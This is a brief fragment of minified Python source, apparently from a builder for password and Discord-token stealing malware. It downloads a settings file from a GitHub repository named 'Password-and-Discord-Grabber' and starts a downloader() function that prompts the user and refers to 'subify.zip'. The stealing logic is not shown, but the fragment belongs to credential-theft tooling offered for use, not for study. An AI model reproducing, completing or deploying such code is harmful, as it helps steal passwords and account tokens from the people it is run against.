...
request=requests.get('https://raw.githubusercontent.com/HydraGang/Password-and-Discord-Grabber/main/settings.json').text.replace('\n','')
...
def downloader():
	D='r';C='Successfully Donwloaded!';B='wb';A='subify.zip';os.system(_A);print(menu);input_=input('Do You want console on your PC or not! (y/n):\n->');download=input_.lower()
	if download=='y':
